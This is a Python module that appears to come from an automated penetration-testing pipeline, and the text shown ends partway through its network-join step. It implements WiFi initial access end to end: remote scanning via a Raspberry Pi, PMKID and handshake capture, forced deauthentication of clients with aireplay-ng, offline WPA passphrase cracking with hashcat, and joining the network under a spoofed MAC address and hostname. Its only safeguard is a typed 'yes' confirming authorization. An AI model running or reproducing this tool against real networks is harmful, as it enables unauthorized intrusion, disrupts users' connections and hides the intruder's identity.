"""
agents/wifi_agent.py
---------------------
Stage 0 — MITRE ATT&CK: TA0001 Initial Access

WiFi initial access via PMKID capture and offline PSK cracking.
Controls the Raspberry Pi remotely over SSH (paramiko) to handle all
wireless operations, then cracks and joins the target network locally.

WHAT THIS AGENT DOES:
    1. SSH into Pi, scan nearby networks via hcxdumptool rcascan
    2. Operator selects target SSID/BSSID
    3. Pi captures PMKID via hcxdumptool (passive, single frame)
    4. Pi converts .pcapng to .hc22000 via hcxpcapngtool
    5. Mac pulls .hc22000 via SCP
    6. Mac cracks PSK via hashcat with Metal GPU (~100 kH/s on M1 Pro)
    7. Mac joins cracked network with spoofed MAC
    8. Populates ctx for DiscoveryAgent

SSH CONNECTION MODEL:
    One persistent paramiko connection is opened at the start of run() and
    reused across all Pi-side methods. Each method calls _get_ssh() rather
    than self._ssh directly.  _get_ssh() checks transport health and
    reconnects automatically if the connection dropped between phases.

AUTHORIZATION:
    Operator must type "yes" to confirm written authorization before any
    packet is transmitted. This cannot be skipped. It is checked in run()
    before _scan_networks() is called.

MOCK MODE:
    WiFiAgent has no mock implementation. can_run() returns False in mock
    mode so the pipeline skips this stage cleanly.

REQUIRES:
    - paramiko (pip install paramiko)
    - hashcat installed locally (brew install hashcat)
    - HASHCAT_WORDLIST set in .env
    - Pi reachable at PI_HOST with key-based SSH auth
    - wlan1 (Alfa adapter) present on Pi
"""

import os
import re
import time
import tempfile
import subprocess

import paramiko

from core.base_agent import BaseAgent, AgentRegistry
from core.engagement import EngagementContext
from config import VERBOSE, DEBUG, MODE, HASHCAT_WORDLIST, PI_SSH_KEY
from tools.real.network_tools import _spoof_mac_context, _restore_mac, _get_active_interface


# ---------------------------------------------------------------------------
# Pi connection config
# ---------------------------------------------------------------------------

# Primary connection is over WiFi. Ethernet is the fallback if the Pi
# isn't broadcasting hotspot and isn't on the home network.
PI_HOST     = "192.168.1.254"
PI_HOST_ETH = "192.168.1.95"
PI_HOTSPOT  = "192.168.4.1"
PI_USER     = "kali"

# Hostname used during network join to avoid broadcasting real device name
# Change this per engagement to blend in with target environment
SPOOF_HOSTNAME = "iPhone"

# How long to wait for rcascan stdout before giving up
SCAN_TIMEOUT_SECONDS = 120

# How long to wait for a PMKID capture before giving up
CAPTURE_TIMEOUT_SECONDS = 90


# ---------------------------------------------------------------------------
# Agent
# ---------------------------------------------------------------------------

@AgentRegistry.register
class WiFiAgent(BaseAgent):
    name        = "WiFiAgent"
    stage       = "wifi"
    description = "WiFi initial access via PMKID capture and offline PSK cracking."
    mitre_tactic      = "TA0001"
    mitre_tactic_name = "Initial Access"
    requires_root    = False   # Mac side doesn't need root; Pi commands use sudo over SSH
    requires_network = False   # We bring our own network access
    requires_llm     = False

    def __init__(self, config=None):
        super().__init__(config)
        # Persistent SSH connection, opened once in run(), reused across methods
        self._ssh: paramiko.SSHClient | None = None
        self._pi_host: str = PI_HOST

    # -------------------------------------------------------------------------
    # can_run
    # -------------------------------------------------------------------------

    def can_run(self, ctx: EngagementContext) -> tuple[bool, str]:
        """
        Skips in mock mode since there's no mock implementation.
        Checks that hashcat is installed locally and a wordlist is configured.
        Does NOT check Pi reachability here, that happens in run() where we can try 
        fallback hosts
        """
        if MODE == "mock":
            return False, "WiFiAgent has no mock implementation -- skipping in mock mode"

        # hashcat must be on the Mac for the crack phase
        result = subprocess.run(
            ["which", "hashcat"],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            return False, "hashcat not found locally. Install with: brew install hashcat"

        if not HASHCAT_WORDLIST:
            return False, "HASHCAT_WORDLIST not set in .env -- needed for crack phase"

        if not os.path.exists(HASHCAT_WORDLIST):
            return False, f"Wordlist not found at {HASHCAT_WORDLIST}"

        return True, ""

    # -------------------------------------------------------------------------
    # run
    # -------------------------------------------------------------------------

    def run(self, ctx: EngagementContext) -> EngagementContext:
        """
        Execute all WiFi initial access phases in sequence.

        Phases:
            1  Scan      Pi scans nearby networks
            2  Select    Operator picks target
            3  Capture   Pi captures PMKID
            4  Convert   Pi converts pcapng to hc22000
            5  Transfer  Mac pulls hc22000 via SCP
            6  Crack     Mac cracks PSK via hashcat
            7  Connect   Mac joins network with spoofed MAC
            8  Detect    Detect assigned subnet
            9  Populate  Write findings to ctx
        """
        ctx.current_stage = self.stage

        # --- Authorization gate ---
        # Operator must explicitly confirm written authorization before any packet is 
        # transmitted
        print(f"\n[WiFiAgent] *** AUTHORIZATION REQUIRED ***")
        print(f"[WiFiAgent] This stage transmits packets over the air.")
        print(f"[WiFiAgent] You must have written authorization to test the target network.")
        print(f"[WiFiAgent] Type 'yes' to confirm authorization and proceed: ", end="")
        answer = input().strip().lower()
        if answer != "yes":
            print(f"[WiFiAgent] Authorization not confirmed -- aborting WiFi stage") #NORMAL
            ctx.log(self.name, "WiFi stage aborted -- authorization not confirmed")
            ctx.mark_stage_complete(self.stage)
            return ctx

        ctx.log(self.name, "Operator confirmed written authorization for WiFi stage")
        print(f"[WiFiAgent] Authorization confirmed. Proceeding.") #NORMAL

        # --- Connect to Pi ---
        connected, err = self._connect_pi()
        if not connected:
            print(f"[WiFiAgent] Could not reach Pi: {err}") #NORMAL
            ctx.log(self.name, "WiFi stage aborted -- Pi unreachable", result=err)
            ctx.mark_stage_complete(self.stage)
            return ctx

        try:
            # --- Phase 1: Scan ---
            print(f"\n[WiFiAgent] Phase 1 -- scanning nearby networks...") #NORMAL
            networks = self._scan_networks()
            if not networks:
                print(f"[WiFiAgent] No networks found -- check wlan1 is up on Pi") #NORMAL
                ctx.log(self.name, "Scan returned no networks")
                ctx.mark_stage_complete(self.stage)
                return ctx

            # --- Phase 2: Operator selects target ---
            target = self._prompt_target_selection(networks)
            if not target:
                print(f"[WiFiAgent] No target selected -- aborting") #NORMAL
                ctx.log(self.name, "WiFi stage aborted -- no target selected")
                ctx.mark_stage_complete(self.stage)
                return ctx

            ssid  = target["ssid"]
            bssid = target["bssid"]
            print(f"[WiFiAgent] Target: {ssid} ({bssid})") #NORMAL
            ctx.log(self.name, "Target selected", result=f"{ssid} {bssid}")

            # --- Phase 3: Capture PMKID ---
            print(f"\n[WiFiAgent] Phase 3 -- capturing PMKID...") #NORMAL
            captured = self._capture_pmkid(bssid)
            if not captured:
                print(f"[WiFiAgent] PMKID capture failed or timed out -- try moving closer to AP") #NORMAL
                ctx.log(self.name, "PMKID capture failed", target=bssid)
                ctx.mark_stage_complete(self.stage)
                return ctx

            ctx.log(self.name, "PMKID captured", target=bssid)

            # --- Phase 4: Convert ---
            print(f"\n[WiFiAgent] Phase 4 -- converting capture...") #NORMAL
            converted = self._convert_capture()
            if not converted:
                print(f"[WiFiAgent] hcxpcapngtool conversion failed") #NORMAL
                ctx.log(self.name, "Conversion failed")
                ctx.mark_stage_complete(self.stage)
                return ctx

            # --- Phase 5: Transfer ---
            print(f"\n[WiFiAgent] Phase 5 -- transferring .hc22000 to Mac...") #NORMAL
            local_hc22000 = self._transfer_to_mac()
            if not local_hc22000:
                print(f"[WiFiAgent] SCP transfer failed") #NORMAL
                ctx.log(self.name, "SCP transfer failed")
                ctx.mark_stage_complete(self.stage)
                return ctx

            ctx.log(self.name, "hc22000 transferred", result=local_hc22000)

            # --- Phase 6: Crack ---
            print(f"\n[WiFiAgent] Phase 6 -- cracking PSK with hashcat...") #NORMAL
            passphrase = self._crack_passphrase(local_hc22000)
            if not passphrase:
                print(f"[WiFiAgent] Hashcat exhausted wordlist -- PSK not found") #NORMAL
                ctx.log(self.name, "Crack failed -- PSK not in wordlist", target=ssid)
                ctx.mark_stage_complete(self.stage)
                return ctx

            print(f"[WiFiAgent] PSK cracked: {passphrase}") #NORMAL
            ctx.log(self.name, "PSK cracked", target=ssid, result="<redacted from log>")

            # --- Phase 7: Connect ---
            print(f"\n[WiFiAgent] Phase 7 -- joining network with spoofed MAC...") #NORMAL
            joined = self._join_network(ssid, passphrase)
            if not joined:
                print(f"[WiFiAgent] Failed to join {ssid} -- check passphrase and adapter") #NORMAL
                ctx.log(self.name, "Network join failed", target=ssid)
                ctx.mark_stage_complete(self.stage)
                return ctx

            ctx.log(self.name, "Joined target network", target=ssid)

            # --- Phase 8: Populate ctx ---
            self._populate_ctx(ctx, ssid, passphrase)

        finally:
            # Always close the SSH connection cleanly on exit, success or failure
            self._close_ssh()

        ctx.mark_stage_complete(self.stage)
        return ctx

    # -------------------------------------------------------------------------
    # SSH connection management
    # -------------------------------------------------------------------------

    def _connect_pi(self) -> tuple[bool, str]:
        """
        Open persistent SSH connection to the Pi. Tries WiFi first, then hotspot, then ethernet
        Returns (True, "") on success, (False, reason) on failure.
        """
        hosts_to_try = [PI_HOST, PI_HOTSPOT, PI_HOST_ETH]

        for host in hosts_to_try:
            if VERBOSE: print(f"[WiFiAgent] Trying SSH to {host}...") #VERBOSE
            try:
                client = paramiko.SSHClient()
                # Auto-accept the Pi's host key, in prod you'd load known_hosts instead
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    hostname=host,
                    username=PI_USER,
                    key_filename=os.path.expanduser(PI_SSH_KEY),
                    timeout=10,
                    banner_timeout=15
                )
                self._ssh     = client
                self._pi_host = host
                print(f"[WiFiAgent] SSH connected to Pi at {host}") #NORMAL
                return True, ""
            except Exception as e:
                if VERBOSE: print(f"[WiFiAgent] SSH to {host} failed: {e}") #VERBOSE
                continue

        return False, f"Pi unreachable on all hosts: {hosts_to_try}"

    def _get_ssh(self) -> paramiko.SSHClient:
        """
        Return the active SSH connection, reconnecting if it dropped.

        Every Pi-side method calls this instead of self._ssh directly so mid-pipeline drop 
        recovers automatically rather than crashing.

        Raises RuntimeError if reconnect fails after 3 attempts.
        """
        transport = self._ssh.get_transport() if self._ssh else None
        if transport and transport.is_active():
            return self._ssh

        # Connection is dead, attempt t oreconnect
        print(f"[WiFiAgent] SSH connection lost, reconnecting...") #NORMAL
        for attempt in range(1, 4):
            if VERBOSE: print(f"[WiFiAgent] Reconnect attempt {attempt}/3") #VERBOSE
            connected, err = self._connect_pi()
            if connected:
                return self._ssh
            time.sleep(5)

        raise RuntimeError(f"[WiFiAgent] Pi unreachable after 3 reconnect attempts")

    def _close_ssh(self):
        """Close the SSH connection cleanly."""
        if self._ssh:
            try:
                self._ssh.close()
            except Exception:
                pass
            self._ssh = None
            if VERBOSE: print(f"[WiFiAgent] SSH connection closed") #VERBOSE

    def _ssh_run(self, command: str, timeout: int = 30) -> tuple[int, str, str]:
        """
        Run a command on the Pi over SSH and return (exit_code, stdout, stderr).

        Wrapper around paramiko exec_command that handles channel lifecycle
        and collects all output before returning.

        Args:
            command: Shell command to run on the Pi.
            timeout: How long to wait for the command to complete (seconds).

        Returns:
            Tuple of (exit_code, stdout_str, stderr_str).
            exit_code is -1 if something went wrong at the transport level.
        """
        if DEBUG: print(f"[WiFiAgent] SSH cmd: {command}") #DEBUG
        try:
            ssh = self._get_ssh()
            stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout)
            exit_code = stdout.channel.recv_exit_status()
            out = stdout.read().decode(errors="replace").strip()
            err = stderr.read().decode(errors="replace").strip()
            if DEBUG: print(f"[WiFiAgent] exit={exit_code} stdout={out[:200]}") #DEBUG
            return exit_code, out, err
        except Exception as e:
            print(f"[WiFiAgent] SSH command error: {e}") #NORMAL
            return -1, "", str(e)

    # -------------------------------------------------------------------------
    # Phase 1 -- scan networks
    # -------------------------------------------------------------------------

    def _scan_networks(self) -> list[dict]:
        """
        Run hcxdumptool rcascan on the Pi and parse the output.

        rcascan streams live results to stdout. We let it run for
        SCAN_TIMEOUT_SECONDS, then kill it / parse whatever comes back
        Output lines look like:
            70:f2:20:27:91:01  6   -62  WPA2    MyNetwork

        Returns a list of dicts with ssid, bssid, channel, signal, and encryption.
        Deduplicated by BSSID, if the same AP appears multiple times  keep
        the entry with the strongest signal reading.
        """
        print(f"[WiFiAgent] Scanning for {SCAN_TIMEOUT_SECONDS}s -- please wait...") #NORMAL

        # Run scan with a timeout. The leading 'timeout' command on the Pi
        # kills hcxdumptool cleanly after N seconds without needing an interactive
        # channel. hcxdumptool v7 manages its own monitor mode internall
        command = (
            f"sudo timeout {SCAN_TIMEOUT_SECONDS} "
            f"hcxdumptool -i wlan1 --rcascan=active --rds=1 -F 2>&1"
        )

        try:
            ssh = self._get_ssh()
            stdin, stdout, stderr = ssh.exec_command(
                command,
                timeout=SCAN_TIMEOUT_SECONDS + 10
            )
            # Block until the timeout kills hcxdumptool, recv_exit_status()
            # waits for the channel to close which happens when the process exits
            stdout.channel.recv_exit_status()
            raw_output = stdout.read().decode(errors="replace")
        except Exception as e:
            print(f"[WiFiAgent] Scan command failed: {e}") #NORMAL
            return []

        if DEBUG: print(f"[WiFiAgent] rcascan raw output:\n{raw_output}") #DEBUG

        # Parse stdout (each AP appears on its own line)
        # Format varies slightly by hcxdumptool version but BSSID is always
        # the first column and SSID is the last (may contain spaces).
        networks = {}
        for line in raw_output.splitlines():
            line = line.strip()
            # Data lines have pipe separators and start with a channel number
            # Format: "  2|01:54:55|01:54:48| -54|485d363735b4|ER5GHz"
            if "|" not in line:
                continue
            parts = line.split("|")
            if len(parts) < 6:
                continue

            # First column is channel -- must be a number
            try:
                int(parts[0].strip())
            except ValueError:
                continue

            mac_raw = parts[4].strip()
            # MAC is 12 hex chars with no colons -- validate before using
            if len(mac_raw) != 12 or not all(c in "0123456789abcdefABCDEF" for c in mac_raw):
                continue

            # Reformat to standard colon-separated MAC
            bssid = ":".join(mac_raw[i:i+2] for i in range(0, 12, 2)).lower()

            ssid = parts[5].strip() or "<hidden>"

            # Signal is negative integer, may have leading space
            try:
                signal = int(parts[3].strip())
            except ValueError:
                signal = -99

            if bssid not in networks or signal > networks[bssid]["signal"]:
                networks[bssid] = {
                    "ssid":   ssid,
                    "bssid":  bssid,
                    "signal": signal,
                }

        result = list(networks.values())
        # Sort by signal strength so the operator sees closest APs first
        result.sort(key=lambda x: x["signal"], reverse=True)

        print(f"[WiFiAgent] Found {len(result)} network(s)") #NORMAL
        if VERBOSE:
            for n in result:
                print(f"[WiFiAgent]   {n['bssid']}  {n['signal']} dBm  {n['ssid']}") #VERBOSE

        return result

    # -------------------------------------------------------------------------
    # Phase 2 -- target selection (interactive)
    # -------------------------------------------------------------------------

    def _prompt_target_selection(self, networks: list[dict]) -> dict | None:
        """
        Show the operator a numbered list and ask them to pick a target, operator must confirm scope before
        any capture begins.

        Returns the selected network dict, or None if operator cancels.
        """
        print(f"\n[WiFiAgent] Networks found:") #NORMAL
        print(f"  {'#':<4} {'BSSID':<20} {'Signal':<8} {'SSID'}") #NORMAL
        print(f"  {'-'*55}") #NORMAL
        for i, net in enumerate(networks, start=1):
            print(f"  {i:<4} {net['bssid']:<20} {net['signal']:<8} {net['ssid']}") #NORMAL

        print(f"\n[WiFiAgent] Enter target number (or 'q' to abort): ", end="") #NORMAL
        choice = input().strip().lower()

        if choice == "q":
            return None

        try:
            index = int(choice) - 1
            if 0 <= index < len(networks):
                return networks[index]
            else:
                print(f"[WiFiAgent] Invalid selection: {choice}") #NORMAL
                return None
        except ValueError:
            print(f"[WiFiAgent] Invalid input: {choice}") #NORMAL
            return None

    # -------------------------------------------------------------------------
    # Phase 3 -- capture PMKID
    # -------------------------------------------------------------------------

    def _capture_pmkid(self, bssid: str) -> bool:
        """
        Capture a PMKID or EAPOL handshake from the target AP.

        Two-phase approach -- minimum footprint first, escalate only if needed:

        Phase 3a -- passive listen (30s, no packets transmitted)
            Silent. Waits for AP to broadcast PMKID or a client to
            naturally authenticate. Checks handshake completeness before
            accepting -- incomplete handshakes produce false positive cracks.

        Phase 3b -- active deauth (remaining timeout)
            Only runs if Phase 3a yields nothing usable.
            Opens two SSH channels on the same transport simultaneously:
            one for hcxdumptool capture, one for aireplay-ng deauth.
            Deauth forces a fresh complete M1-M4 handshake.

        Args:
            bssid: Target BSSID in xx:xx:xx:xx:xx:xx format.
        """
        import socket as _socket

        bssid_no_colons = bssid.replace(":", "")

        # Write BPF filter -- target only frames from this BSSID
        bpf_command = (
            f"hcxdumptool --bpfc=\"wlan addr3 {bssid_no_colons}\" > /tmp/filter.bpf"
        )
        exit_code, _, err = self._ssh_run(bpf_command, timeout=15)
        if exit_code != 0:
            print(f"[WiFiAgent] BPF filter write failed: {err}") #NORMAL
            return False

        if VERBOSE: print(f"[WiFiAgent] BPF filter written for {bssid}") #VERBOSE

        # Clean up stale capture files -- hcxdumptool won't overwrite existing files
        self._ssh_run("sudo rm -f /tmp/capture.pcapng /tmp/capture.hc22000 /tmp/capture_check.hc22000", timeout=5)
        if VERBOSE: print(f"[WiFiAgent] Cleared stale capture files") #VERBOSE

        # -----------------------------------------------------------------
        # Phase 3a -- passive listen, no deauth
        # -----------------------------------------------------------------
        PASSIVE_TIMEOUT = 30
        print(f"[WiFiAgent] Phase 3a -- passive listen ({PASSIVE_TIMEOUT}s, no packets transmitted)...") #NORMAL

        passive_command = (
            f"sudo timeout {PASSIVE_TIMEOUT} "
            f"hcxdumptool -i wlan1 -w /tmp/capture.pcapng "
            f"--bpf=/tmp/filter.bpf --rds=2 "
            f"--disable_disassociation 2>&1"
        )

        pmkid_found = False
        try:
            ssh = self._get_ssh()
            stdin, stdout, stderr = ssh.exec_command(
                passive_command,
                timeout=PASSIVE_TIMEOUT + 10
            )
            while True:
                line = stdout.readline()
                if not line:
                    break
                line = line.strip()
                if DEBUG: print(f"[WiFiAgent] hcxdumptool: {line}") #DEBUG
                if "P+" in line:
                    pmkid_found = True
                    print(f"[WiFiAgent] PMKID captured (passive)!") #NORMAL
                elif "p+" in line.lower():
                    pmkid_found = True
                    print(f"[WiFiAgent] EAPOL frames seen (passive)...") #NORMAL

            stdout.channel.recv_exit_status()

        except Exception as e:
            print(f"[WiFiAgent] Passive capture error: {e}") #NORMAL
            return False

        # Check file size
        exit_code, out, _ = self._ssh_run("stat -c%s /tmp/capture.pcapng 2>/dev/null")
        passive_size = int(out.strip() or "0") if exit_code == 0 and out else 0

        # Check handshake completeness -- WPA*02* indicates a usable complete
        # handshake. WPA*01* alone is PMKID only and may produce false positives.
        # Only accept passive capture if we have at least one complete handshake.
        complete_handshakes = 0
        if pmkid_found and passive_size > 0:
            self._ssh_run(
                "hcxpcapngtool -o /tmp/capture_check.hc22000 /tmp/capture.pcapng > /dev/null 2>&1",
                timeout=30
            )
            _, hc_check, _ = self._ssh_run(
                "grep -c 'WPA\\*02\\*' /tmp/capture_check.hc22000 2>/dev/null || echo 0",
                timeout=10
            )
            try:
                complete_handshakes = int(hc_check.strip() or "0")
            except ValueError:
                complete_handshakes = 0
            if VERBOSE: print(f"[WiFiAgent] Complete handshakes in passive capture: {complete_handshakes}") #VERBOSE

        if pmkid_found and passive_size > 0 and complete_handshakes > 0:
            print(f"[WiFiAgent] Passive capture successful with complete handshake -- skipping deauth") #NORMAL
            # Use the check file as the final capture since it's already converted
            self._ssh_run("cp /tmp/capture_check.hc22000 /tmp/capture.hc22000", timeout=5)
            return True
        elif pmkid_found and passive_size > 0:
            print(f"[WiFiAgent] Passive capture incomplete handshake -- escalating to active deauth") #NORMAL
        else:
            print(f"[WiFiAgent] Passive capture yielded nothing -- escalating to active deauth") #NORMAL

        # -----------------------------------------------------------------
        # Phase 3b -- active deauth + capture simultaneously
        # Opens two channels on the same SSH transport:
        #   Channel 1 -- hcxdumptool capture
        #   Channel 2 -- aireplay-ng deauth (forces complete M1-M4 handshake)
        # Deauth runs 5s after capture starts so hcxdumptool is fully
        # initialized before we force client reconnection.
        # -----------------------------------------------------------------
        ACTIVE_TIMEOUT = CAPTURE_TIMEOUT_SECONDS - PASSIVE_TIMEOUT
        print(f"[WiFiAgent] Phase 3b -- active deauth ({ACTIVE_TIMEOUT}s)...") #NORMAL

        # Remove passive capture file so active phase starts fresh
        self._ssh_run("sudo rm -f /tmp/capture.pcapng /tmp/capture_check.hc22000", timeout=5)

        # Detect target channel -- needed to lock aireplay-ng to correct channel
        # hcxdumptool manages its own channel internally, only aireplay-ng needs this
        _, chan_out, _ = self._ssh_run(
            f"sudo iw dev wlan1 scan 2>/dev/null | grep -A5 '{bssid}' | "
            f"grep 'primary channel' | awk '{{print $3}}'",
            timeout=20
        )
        target_channel = chan_out.strip() if chan_out.strip().isdigit() else "6"
        if VERBOSE: print(f"[WiFiAgent] Target channel: {target_channel}") #VERBOSE

        capture_cmd = (
            f"sudo timeout {ACTIVE_TIMEOUT} "
            f"hcxdumptool -i wlan1 -w /tmp/capture.pcapng "
            f"--bpf=/tmp/filter.bpf --rds=2 2>&1"
        )

        # Deauth runs after 5s delay -- gives hcxdumptool time to initialize
        # before we force clients to reconnect
        deauth_cmd = (
            f"sleep 5 && sudo iwconfig wlan1 channel {target_channel} 2>/dev/null; "
            f"sudo aireplay-ng -0 5 -a {bssid} wlan1 2>&1"
        )

        pmkid_found = False
        try:
            transport = self._get_ssh().get_transport()

            # Channel 1 -- hcxdumptool capture (primary, we read stdout)
            cap_channel = transport.open_session()
            cap_channel.exec_command(capture_cmd)

            # Channel 2 -- aireplay-ng deauth (fire and forget)
            deauth_channel = transport.open_session()
            deauth_channel.exec_command(deauth_cmd)

            # Read capture stdout line by line
            cap_channel.settimeout(ACTIVE_TIMEOUT + 10)
            while True:
                try:
                    line = cap_channel.makefile().readline()
                    if not line:
                        break
                    line = line.strip()
                    if DEBUG: print(f"[WiFiAgent] hcxdumptool: {line}") #DEBUG
                    if "P+" in line:
                        pmkid_found = True
                        print(f"[WiFiAgent] PMKID captured (active)!") #NORMAL
                    elif "p+" in line.lower():
                        pmkid_found = True
                        print(f"[WiFiAgent] EAPOL handshake captured (active)!") #NORMAL
                except _socket.timeout:
                    break

            cap_channel.recv_exit_status()

            if DEBUG:
                deauth_out = deauth_channel.makefile().read()
                print(f"[WiFiAgent] aireplay-ng: {deauth_out}") #DEBUG

            deauth_channel.close()
            cap_channel.close()

        except Exception as e:
            print(f"[WiFiAgent] Active capture error: {e}") #NORMAL
            return False

        # Verify final capture file has content
        exit_code, out, _ = self._ssh_run("stat -c%s /tmp/capture.pcapng 2>/dev/null")
        if exit_code != 0 or not out or int(out.strip() or "0") == 0:
            print(f"[WiFiAgent] Capture file empty or missing after both phases") #NORMAL
            return False

        if VERBOSE: print(f"[WiFiAgent] Capture file size: {out.strip()} bytes") #VERBOSE

        if not pmkid_found:
            print(f"[WiFiAgent] No PMKID/EAPOL seen in stdout -- attempting conversion anyway") #NORMAL

        return True

    # -------------------------------------------------------------------------
    # Phase 4 -- convert to hc22000
    # -------------------------------------------------------------------------

    def _convert_capture(self) -> bool:
        """
        Convert the captured pcapng to hc22000 format on the Pi.

        hcxpcapngtool extracts the PMKID values and associated MACs/SSID
        from the raw packet capture and writes them in the flat text format
        that hashcat's -m 22000 mode expects.

        Returns True if the output file was created and is non-empty.
        """
        command = "hcxpcapngtool -o /tmp/capture.hc22000 /tmp/capture.pcapng 2>&1"
        exit_code, out, err = self._ssh_run(command, timeout=30)

        if DEBUG: print(f"[WiFiAgent] hcxpcapngtool output: {out}") #DEBUG

        if exit_code != 0:
            print(f"[WiFiAgent] hcxpcapngtool failed (exit {exit_code}): {err}") #NORMAL
            return False

        # Verify output file exists and has content
        exit_code, size_out, _ = self._ssh_run("stat -c%s /tmp/capture.hc22000 2>/dev/null")
        if exit_code != 0 or not size_out or int(size_out.strip() or "0") == 0:
            print(f"[WiFiAgent] hc22000 file empty or missing -- no PMKID extracted") #NORMAL
            return False

        print(f"[WiFiAgent] Converted successfully ({size_out.strip()} bytes)") #NORMAL
        return True

    # -------------------------------------------------------------------------
    # Phase 5 -- transfer to Mac
    # -------------------------------------------------------------------------

    def _transfer_to_mac(self) -> str | None:
        """
        Pull the .hc22000 file from the Pi to a local temp path via SCP.
        Returns the local file path on success, None on failure.
        """
        # Use a named temp file so hashcat can open it by path
        tmp = tempfile.NamedTemporaryFile(
            suffix=".hc22000",
            delete=False,
            prefix="wifi_capture_"
        )
        local_path = tmp.name
        tmp.close()

        try:
            from scp import SCPClient
            ssh = self._get_ssh()
            with SCPClient(ssh.get_transport()) as scp:
                scp.get("/tmp/capture.hc22000", local_path)

            size = os.path.getsize(local_path)
            if size == 0:
                print(f"[WiFiAgent] Transferred file is empty") #NORMAL
                return None

            print(f"[WiFiAgent] hc22000 saved to {local_path} ({size} bytes)") #NORMAL
            if VERBOSE: print(f"[WiFiAgent] Local hc22000 path: {local_path}") #VERBOSE
            return local_path

        except Exception as e:
            print(f"[WiFiAgent] SCP transfer failed: {e}") #NORMAL
            return None

    # -------------------------------------------------------------------------
    # Phase 6 -- crack PSK
    # -------------------------------------------------------------------------

    def _crack_passphrase(self, hc22000_path: str) -> str | None:
        """
        Run hashcat locally against the .hc22000 file to recover the PSK.

        Uses -m 22000 (WPA-PBKDF2-PMKID+EAPOL) and -d 1 to target the
        first device, which on M1 Pro is the Metal GPU (~100 kH/s).

        Parses hashcat stdout for the cracked line format: hash:plaintext

        Returns the plaintext passphrase on success, None if wordlist exhausted.
        """
        command = [
            "hashcat",
            "-m", "22000",
            "-d", "1",           # device 1 = Metal GPU on M1 Pro
            "--quiet",           # suppress progress bar, only show cracked lines
            "--status",          # still print status updates
            "--status-timer=10", # status every 10 seconds
            hc22000_path,
            HASHCAT_WORDLIST
        ]

        if DEBUG: print(f"[WiFiAgent] hashcat command: {' '.join(command)}") #DEBUG

        try:
            proc = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            passphrase = None
            for line in proc.stdout:
                line = line.strip()
                if not line:
                    continue
                if DEBUG: print(f"[WiFiAgent] hashcat: {line}") #DEBUG
                elif VERBOSE and ("Status" in line or "Speed" in line or "Progress" in line):
                    print(f"[WiFiAgent] {line}") #VERBOSE

                # Cracked line format: <hash>:<passphrase>
                # The hash portion is long (60+ chars) so we look for a colon
                # with a plausible WPA passphrase (8-63 chars) after it
                if ":" in line and not line.startswith("[") and not line.startswith("*"):
                    # Handle hashcat's $HEX[] format -- output looks like:
                    # hash:passphrase -> $HEX[hexencoded]
                    # The part before " -> " is the usable plaintext
                    if " -> " in line:
                        line = line.split(" -> ")[0].strip()

                    parts = line.rsplit(":", 1)
                    if len(parts) == 2:
                        candidate = parts[1].strip()
                        # WPA passphrases are 8-63 printable ASCII characters
                        if 8 <= len(candidate) <= 63:
                            passphrase = candidate
                            if VERBOSE: print(f"[WiFiAgent] Cracked line detected") #VERBOSE

            proc.wait()

            if passphrase:
                return passphrase

            # hashcat exit code 1 = exhausted, nothing found
            # hashcat exit code 0 = found at least one hash
            if proc.returncode == 0 and not passphrase:
                # --quiet sometimes suppresses the cracked line -- try --show as fallback
                show_result = subprocess.run(
                    ["hashcat", "-m", "22000", "--show", hc22000_path],
                    capture_output=True, text=True
                )
                for line in show_result.stdout.splitlines():
                    if ":" in line:
                        parts = line.rsplit(":", 1)
                        if len(parts) == 2:
                            candidate = parts[1].strip()
                            if 8 <= len(candidate) <= 63:
                                return candidate

            return None

        except Exception as e:
            print(f"[WiFiAgent] hashcat error: {e}") #NORMAL
            return None

    # -------------------------------------------------------------------------
    # Phase 7 -- join network
    # -------------------------------------------------------------------------

    def _join_network(self, ssid: str, passphrase: str) -> bool:
        """
        Join the cracked network on the Mac with a spoofed MAC address.

        macOS will silently ignore a networksetup join if a stale preferred
        network entry exists for the SSID, so we remove it first.

        MAC is spoofed before joining and restored after so our real hardware
        identifier never appears on the target network's ARP table. If mac spoofing fails it 
        asks the operator whether or not OK to conitnue

        Args:
            ssid:       SSID to join.
            passphrase: Cracked WPA passphrase.

        Returns True if the join command succeeded, False otherwise.
        """
        interface = _get_active_interface() or "en0"


        # --- MAC spoofing ---
        # Try explicit MAC spoof first. On macOS Sequoia, private WiFi address
        # feature may block this -- if it fails, macOS is already randomizing
        # the MAC per-network at the driver level, which is equivalent protection.
        original_mac, spoofed_mac = _spoof_mac_context(interface)
        if spoofed_mac:
            print(f"[WiFiAgent] MAC spoofed successfully") #NORMAL
        else:
            # Check if macOS private WiFi address is active (Sequoia+)
            # If so, hardware MAC is already protected -- safe to proceed
            ifconfig_mac = subprocess.run(
                ["ifconfig", interface],
                capture_output=True, text=True
            ).stdout
            hw_mac = subprocess.run(
                ["networksetup", "-getmacaddress", interface],
                capture_output=True, text=True
            ).stdout.strip()

            # If ifconfig MAC differs from hardware MAC, randomization is active
            if hw_mac and hw_mac.split()[-1].lower() not in ifconfig_mac.lower():
                print(f"[WiFiAgent] MAC spoof failed but macOS private WiFi address is active -- hardware MAC protected") #NORMAL
            else:
                print(f"[WiFiAgent] MAC spoofing failed -- your real MAC will be visible on the target network") #NORMAL
                print(f"[WiFiAgent] Proceed anyway? (yes/no): ", end="") #NORMAL
                answer = input().strip().lower()
                if answer != "yes":
                    print(f"[WiFiAgent] Aborting join -- MAC spoof required") #NORMAL
                    return False

        # --- Hostname spoofing ---
        # macOS broadcasts hostname via mDNS immediately on network join
        # Spoof to something generic before joining
        original_hostname = subprocess.run(
            ["scutil", "--get", "LocalHostName"],
            capture_output=True, text=True
        ).stdout.strip()

        subprocess.run(["sudo", "scutil", "--set", "ComputerName", SPOOF_HOSTNAME], capture_output=True)
        subprocess.run(["sudo", "scutil", "--set", "LocalHostName", SPOOF_HOSTNAME], capture_output=True)
        if VERBOSE: print(f"[WiFiAgent] Hostname spoofed: {original_hostname} -> {SPOOF_HOSTNAME}") #VERBOSE


        try:
            # Remove stale preferred network entry if one exists.
            # Without this, macOS may quietly reconnect to the old entry instead
            # of the one we're about to add with the wrong creds
            subprocess.run(
                ["networksetup", "-removepreferredwirelessnetwork", interface, ssid],
                capture_output=True, text=True
            )
            if VERBOSE: print(f"[WiFiAgent] Removed stale preferred entry for {ssid}") #VERBOSE

            # Add network and set it as preferred this triggers the join
